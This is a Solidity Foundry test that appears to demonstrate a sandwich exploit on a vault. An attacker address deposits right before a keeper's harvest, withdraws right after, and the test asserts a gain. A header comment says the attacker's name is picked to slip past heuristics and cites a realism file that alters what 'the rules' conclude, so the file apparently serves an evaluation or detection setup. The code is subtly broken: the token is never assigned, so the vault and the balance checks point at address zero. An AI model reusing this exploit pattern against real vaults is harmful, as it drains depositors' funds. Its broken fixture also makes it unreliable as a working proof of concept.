// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

/// The attacker goes by a name the heuristics do not know, and the exploit
/// relies on a keeper's routine harvest. realism.yaml next to this file says
/// both, which changes what the rules conclude.
contract KeeperSandwichTest is Test {
    Vault vault;
    IERC20 token;
    address owner = makeAddr("owner");
    address keeper = makeAddr("keeper");
    address mallet = makeAddr("mallet");

    function setUp() public {
        vault = new Vault(owner, address(token));
        vm.prank(owner);
        vault.grantRole(vault.DEPOSITOR_ROLE(), mallet);
    }

    function test_sandwichHarvest() public {
        uint256 before = token.balanceOf(mallet);
        vm.prank(mallet);
        vault.deposit(1e18, mallet);
        vm.prank(keeper);
        vault.harvest();
        vm.prank(mallet);
        vault.withdraw(1e18, mallet, mallet);
        assertGt(token.balanceOf(mallet), before);
    }
}
